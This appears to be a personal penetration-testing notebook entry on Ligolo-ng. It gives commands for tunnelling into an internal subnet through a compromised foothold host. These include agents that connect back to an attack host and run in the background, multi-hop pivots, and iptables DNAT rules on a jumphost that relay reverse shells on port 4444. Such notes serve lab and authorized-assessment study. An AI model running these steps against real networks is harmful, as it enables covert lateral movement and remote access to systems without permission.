---
type: tool
category: networking
tags: [tool/networking, pivoting, tunneling, post-exploitation]
---

# Overview
Advanced, fast, and lightweight tunneling tool leveraging TUN interfaces to establish Layer 3 pivots without SOCKS proxies. Which means, there's no need to use "proxychains" anymore, like it was the case with e.g. "chisel" . 

This allows us to use any tool, like we are directly in the target-subnet.

## How to setup

#### Setup Layer-3 dynamic port forwarding (Ligolo)
1. Create a TUN-Interface and start the `Ligolo-Proxy`
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```
2. Add the target subnet as route on the local machine:
```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```
3. Upload the Ligolo-ng "agent" to the "foothold-host". Agents are located here:
```bash
cd /usr/share/ligolo-ng-common-binaries/
```
##### Target: Linux 
1. Establish a connection back to the attack-host:
```bash
chmod +x agent
```

```bash
./agent -connect <ATTACK_IP>:11601 -ignore-cert
```
start session in the background (so that terminal doesn't get blocked):
```bash
./agent -connect 10.10.15.95:11601 -ignore-cert > /dev/null 2>&1 &
```

##### Target: Windows
1. Establish a connection back to the attack host:
```powershell
.\ligolo-ng_agent_0.9.1_windows_amd64.exe -connect 10.10.15.52:11601 -ignore-cert
```

##### Multi-Hop-Pivoting
| Host             | Interface / Dienst | IP-Adresse / Port |
| :--------------- | :----------------- | :---------------- |
| **Attackbox**    | `tun0`             | 10.10.15.52       |
|                  | `ligolo`           | 127.0.0.1:11601   |
|                  | `ligolo-secondo`   | 127.0.0.1:11601   |
| **First-Pivot**  | `Ethernet0`        | 10.10.15.225      |
|                  | `Ethernet1`        | 172.16.5.150      |
|                  | `ligolo-agent`     | 0.0.0.0:11601     |
| **Second-Pivot** | `Ethernet0`        | 172.16.5.19       |
|                  | `Ethernet1`        | 172.16.6.19       |

This way we can stack several hosts behind each other.
1. Create a second virtual interface in a new terminal:
```bash
sudo ip tuntap add user root mode tun ligolo_secondo
sudo ip link set ligolo_secondo up
```
2. Add a listener inside the first session (in the active `ligolo terminal`):
```ligolo
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925172058.png)
3. Connect back from the `second pivot` (over the first pivot), e.g. with windows:
```powershell
.\ligolo-ng_agent_0.9.1_windows_amd64.exe -connect 172.16.5.150:11601 -ignore-cert
```
4. We can now switch to the newly created session:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925172521.png)
5. And add the route to the newly available subnet (on second interface):
```bash
sudo ip route add 172.16.6.0/24 dev ligolo_secondo
```
6. Start the tunnel to the second pivot:
```ligolo
start --tun ligolo_secondo
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925174005.png)


### After executing agent
Choose `session` within "Ligolo" and `start` it:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902144945.png)

### DNAT on Linux-Jumphost (sudo needed)
In order to place e.g a reverse-shell on a server located on the jumphost-network we need to work with the gateway, route or SNAT. In most cases we only have access to the jumphost, thus gateway and route are not really practical. Which leaves us with DNAT:
1. activate IP-Forwarding on jumphost
```bash
sysctl -w net.ipv4.ip_forward=1
```
2. specify which ports should be forwarded and to which destination:
```bash
iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination 10.10.14.124:4444
```
3. replaces the source-ip from e.g. the target server to the jumphosts IP: 
```bash
iptables -t nat -A POSTROUTING -p tcp -d 10.10.14.124 --dport 4444 -j MASQUERADE
```
4. delete DNAT & MASQUERADE rules:
```bash
iptables -t nat -F
```
5. check if they are really gone:
```bash
iptables -t nat -L -n -v
```
#### With Socat
Set up a simple port-based forwarder:
![[Socat#^81a449]]

### Stop Service after use
```bash
ligolo-ng » stop
```
## Important Parameter
